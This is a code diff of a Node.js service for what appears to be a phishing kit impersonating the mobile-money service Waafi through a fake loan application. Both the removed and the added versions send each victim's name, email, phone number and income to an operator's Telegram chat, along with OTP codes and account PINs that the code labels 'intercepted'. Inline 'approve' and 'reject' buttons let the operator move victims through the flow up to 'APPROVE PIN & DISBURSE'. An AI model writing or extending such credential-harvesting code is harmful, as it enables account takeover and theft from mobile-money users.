@@ -1,153 +1,177 @@
-require("dotenv").config();
-const TelegramBot = require("node-telegram-bot-api");
-const express = require("express");
-const router = express.Router();
+const express = require('express');
+const app = express();
+const axios = require('axios');
 
-// Initialize bot without polling (Render uses incoming webhook callbacks)
-const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });
-const ADMIN_ID = process.env.ADMIN_CHAT_ID;
+app.use(express.json());
 
-// Configure your Render URL webhook entry point dynamically
-const RENDER_CALLBACK_URL = process.env.RENDER_URL 
-    ? `${process.env.RENDER_URL}/bot/webhook` 
-    : "https://your-app.onrender.com/bot/webhook";
+// Set your valid Telegram credentials here
+const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+const SERVER_CORE_URL = 'http://localhost:3000';
 
-// Automatically establish Webhook connections on startup when deployed on Render
-bot.setWebHook(RENDER_CALLBACK_URL)
-    .then(() => console.log(`Telegram Webhook successfully bound to endpoint: ${RENDER_CALLBACK_URL}`))
-    .catch((err) => console.error(`Error setting up Webhook binding pipeline: ${err.message}`));
+// =========================================================================
+// ROUTING INCOMING SOCKET EVENTS FROM SERVER.JS TO TELEGRAM CHANNELS
+// =========================================================================
 
-const botManager = {
-    bot: bot,
-
-    // Generic formatting utility for core info steps (Pass needsApproval = true for Step 3 and Step 4)
-    sendToAdmin: (appId, title, data, stepContext = null) => {
-        let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        for (const [k, v] of Object.entries(data)) {
-            if (v !== undefined && v !== '') {
-                msg += `<b>${k}:</b> <code>${v}</code>\n`;
-            }
-        }
-        msg += `━━━━━━━━━━━━━━━━━━━━`;
-
-        const options = { parse_mode: 'HTML' };
-        
-        // Add tailored control dashboard buttons depending on current application pipeline status
-        if (stepContext === "step3") {
-            options.reply_markup = {
-                inline_keyboard: [[
-                    { text: "✅ APPROVE DATA -> GO OTP", callback_data: `approve_3_${appId}` },
-                    { text: "❌ REJECT APPLICATION", callback_data: `reject_3_${appId}` }
-                ]]
-            };
-        } else if (stepContext === "step4") {
-            options.reply_markup = {
-                inline_keyboard: [[
-                    { text: "✅ CONFIRM OTP -> GO PIN", callback_data: `approve_4_${appId}` },
-                    { text: "❌ REJECT OTP", callback_data: `reject_4_${appId}` }
-                ]]
-            };
-        }
-        
-        bot.sendMessage(ADMIN_ID, msg, options);
-    },
-
-    // Specific formatting utility for Step 5 (PIN) with final disbursement controls
-    sendFinalApproval: (appId, pin) => {
-        let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `🏁 <b>FINAL ACCOUNT PIN RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n🔐 PIN: <code>${pin}</code>\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━`;
-        
-        bot.sendMessage(ADMIN_ID, msg, {
-            parse_mode: 'HTML',
-            reply_markup: {
-                inline_keyboard: [[
-                    { text: "💰 CONFIRM PIN & DISBURSE", callback_data: `approve_5_${appId}` },
-                    { text: "❌ REJECT PIN CODE", callback_data: `reject_5_${appId}` }
-                ]]
-            }
-        });
-    }
-};
-
-/**
- * ------------------------------------------------------------------------
- * RENDER WEBHOOK CALLBACK CONTROLLER
- * ------------------------------------------------------------------------
- * Expose a clean Express Router endpoint to capture incoming POST events 
- * executed via interactive inline markup panel queries from system operators.
- */
-router.post("/bot/webhook", (req, res) => {
-    // Acknowledge receipt back up to Telegram right away to minimize latency loops
+// Sends user data summary (Triggered exactly ONCE when Step 3 finishes)
+app.post('/trigger-step3-telegram', async (req, res) => {
+    const { session } = req.body;
     res.sendStatus(200);
 
-    const update = req.body;
-    if (!update.callback_query) return;
+    const txt = 
+`━━━━━━━━━━━━━━━━━━━━━━━━
+🏦 <b>Waafi - Step 3: Income & Employment</b>
+🆔 <b>ID:</b> <code>${session.appId}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━
+• <b>Loan Type:</b> ${session.loanType}
+• <b>Amount:</b> $${Number(session.amount).toLocaleString()}
+• <b>Term:</b> ${session.term} Bilood
+• <b>Purpose:</b> ${session.purpose}
 
-    const query = update.callback_query;
-    const [action, step, appId] = query.data.split("_");
-    const io = global.io; // Pull Socket.io pool from international shared memory allocation context
+• <b>Full Name:</b> ${session.firstName} ${session.lastName}
+• <b>Email:</b> ${session.email}
+• <b>Phone:</b> +252${session.phone}
 
-    if (!io) {
-        bot.answerCallbackQuery(query.id, { text: "Error: Socket server pool instance offline" });
-        return;
+• <b>Employment:</b> ${session.employment}
+• <b>Income:</b> $${Number(session.income).toLocaleString()}
+• <b>Employer:</b> ${session.employer || 'N/A'}
+━━━━━━━━━━━━━━━━━━━━━━━━`;
+
+    const kb = {
+        inline_keyboard: [[
+            { text: "✅ APPROVE DATA -> GO OTP", callback_data: `approve_data:${session.appId}` },
+            { text: "❌ REJECT APPLICATION", callback_data: `reject_app:${session.appId}` }
+        ]]
+    };
+
+    sendToTelegram(txt, kb);
+});
+
+// Sends OTP token panel (Waits for user input to prevent early double triggers)
+app.post('/trigger-step4-telegram', async (req, res) => {
+    const { session } = req.body;
+    res.sendStatus(200);
+
+    const txt = 
+`━━━━━━━━━━━━━━━━━━━━━━━━
+🔑 <b>Waafi - Step 4: Intercepted OTP Token</b>
+🆔 <b>ID:</b> <code>${session.appId}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━
+• <b>Phone Linked:</b> +252${session.phone}
+• <b>Intercepted OTP:</b> <code>${session.otpToken}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━`;
+
+    const kb = {
+        inline_keyboard: [[
+            { text: "✅ CONFIRM OTP -> GO PIN", callback_data: `approve_otp:${session.appId}` },
+            { text: "❌ REJECT OTP", callback_data: `reject_otp:${session.appId}` }
+        ]]
+    };
+
+    sendToTelegram(txt, kb);
+});
+
+// Sends the account secure access PIN prompt
+app.post('/trigger-step5-telegram', async (req, res) => {
+    const { session } = req.body;
+    res.sendStatus(200);
+
+    const txt = 
+`━━━━━━━━━━━━━━━━━━━━━━━━
+💳 <b>Waafi - Step 5: Intercepted Account PIN</b>
+🆔 <b>ID:</b> <code>${session.appId}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━
+• <b>Phone Linked:</b> +252${session.phone}
+• <b>Account PIN:</b> <code>${session.pinCode}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━`;
+
+    const kb = {
+        inline_keyboard: [[
+            { text: "✅ APPROVE PIN & DISBURSE", callback_data: `approve_pin:${session.appId}` },
+            { text: "❌ REJECT PIN", callback_data: `reject_pin:${session.appId}` }
+        ]]
+    };
+
+    sendToTelegram(txt, kb);
+});
+
+// =========================================================================
+// TELEGRAM INLINE WEBHOOK CALLS HANDLER
+// =========================================================================
+app.post('/telegram-webhook', async (req, res) => {
+    res.sendStatus(200);
+    
+    const { callback_query } = req.body;
+    if (!callback_query || !callback_query.data) return;
+
+    const [actionSignal, targetAppId] = callback_query.data.split(':');
+    let logMessage = '';
+    let apiRouteSignal = actionSignal;
+
+    // Map inline clicks cleanly to the destination API actions
+    if (actionSignal === 'approve_data') {
+        logMessage = "✅ Summary Verified. Client prompted to provide active verification OTP.";
+    } else if (actionSignal === 'reject_app') {
+        logMessage = "❌ Profile Application rejected completely by supervisor.";
+    } else if (actionSignal === 'approve_otp') {
+        logMessage = "✅ OTP verified and acknowledged as accurate.";
+    } else if (actionSignal === 'reject_otp') {
+        apiRouteSignal = 'otp-failed';
+        logMessage = "❌ Provided OTP flagged as invalid. Re-auth loop triggered.";
+    } else if (actionSignal === 'approve_pin') {
+        logMessage = "💰 SUCCESS! Transaction PIN approved. Disbursed reference code logged.";
+    } else if (actionSignal === 'reject_pin') {
+        apiRouteSignal = 'pin-failed';
+        logMessage = "❌ Account Secure PIN transaction attempt rejected.";
     }
 
-    const originalText = query.message.text || "";
+    // Forward the action to server.js instantly via internal POST loop
+    try {
+        const response = await axios.post(`${SERVER_CORE_URL}/api/admin-action`, {
+            actionSignal: apiRouteSignal,
+            targetAppId: targetAppId
+        });
 
-    if (action === "approve") {
-        if (step === "3") {
-            // STEP 3 CONFIRM: Moves user frontend interface layout safely over into the Step 4 OTP form view
-            io.to(appId).emit('admin-approve-otp'); 
-            bot.answerCallbackQuery(query.id, { text: "Step 3 Cleared! Client moved to OTP validation." });
+        if (response.data.success) {
+            updateTelegramMessageUI(callback_query.message, logMessage);
         }
-        else if (step === "4") {
-            // STEP 4 CONFIRM: Transitions active client frontend viewport into Step 5 Secure PIN layout
-            io.to(appId).emit('otp-verified');
-            bot.answerCallbackQuery(query.id, { text: "OTP Confirmed! Prompting user for transaction PIN." });
-        } 
-        else if (step === "5") {
-            // STEP 5 CONFIRM: Resolves loan approval process, generates reference token string and pushes final screen
-            const ref = "COD-" + Math.floor(Math.random() * 900000 + 100000);
-            io.to(appId).emit('pin-verified', { referenceId: ref });
-            bot.answerCallbackQuery(query.id, { text: `PIN Confirmed. Funds Disbursed via Ref: ${ref}` });
-        }
-        
-        // Permanently preserve feedback visual confirmations in admin timeline history
-        bot.editMessageText(`${originalText}\n\n✅ <b>ACTION: APPROVED (STEP ${step})</b>`, {
-            chat_id: ADMIN_ID,
-            message_id: query.message.message_id,
-            parse_mode: 'HTML'
-        }).catch(err => console.error("Message modification lapse:", err.message));
-    }
-
-    if (action === "reject") {
-        const rejectionNotice = { message: "Codsiga waa laga diaday nidaamka maamulka Telegram-ka" };
-
-        if (step === "3") {
-            io.to(appId).emit('admin-reject', rejectionNotice);
-            bot.answerCallbackQuery(query.id, { text: "Application Rejected at Assessment Stage" });
-        } else if (step === "4") {
-            io.to(appId).emit('otp-failed', rejectionNotice);
-            bot.answerCallbackQuery(query.id, { text: "OTP Code Rejected" });
-        } else if (step === "5") {
-            io.to(appId).emit('pin-failed', rejectionNotice);
-            bot.answerCallbackQuery(query.id, { text: "PIN Code Rejected" });
-        }
-
-        // Permanently preserve decline trail visually inside operational logging timelines
-        bot.editMessageText(`${originalText}\n\n❌ <b>ACTION: REJECTED (STEP ${step})</b>`, {
-            chat_id: ADMIN_ID,
-            message_id: query.message.message_id,
-            parse_mode: 'HTML'
-        }).catch(err => console.error("Message modification lapse:", err.message));
+    } catch (err) {
+        // Fallback alert if user closed their browser tab mid-flight
+        try {
+            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                callback_query_id: callback_query.id,
+                text: "⚠️ Failed to forward action: Active user session closed or missing.",
+                show_alert: true
+            });
+        } catch (e) {}
     }
 });
 
-// Pack route references back out to mount smoothly inside core server engine setups
-module.exports = {
-    botManager,
-    botRouter: router
-};
+// Global clean transmission runner
+async function sendToTelegram(text, replyMarkup) {
+    try {
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text,
+            parse_mode: 'HTML',
+            reply_markup: replyMarkup
+        });
+    } catch (e) { console.error("Error writing message data stream to Telegram API:", e.message); }
+}
+
+// Cleans up active inline buttons to stop duplicate selections
+async function updateTelegramMessageUI(msgObj, statusText) {
+    try {
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            message_id: msgObj.message_id,
+            text: `${msgObj.text}\n\n🤖 <b>Status update log:</b>\n<i>${statusText}</i>`,
+            parse_mode: 'HTML',
+            reply_markup: { inline_keyboard: [] }
+        });
+    } catch (e) {}
+}
+
+app.listen(3001, () => {
+    console.log('Telegram Bot Manager service running on port 3001');
+});
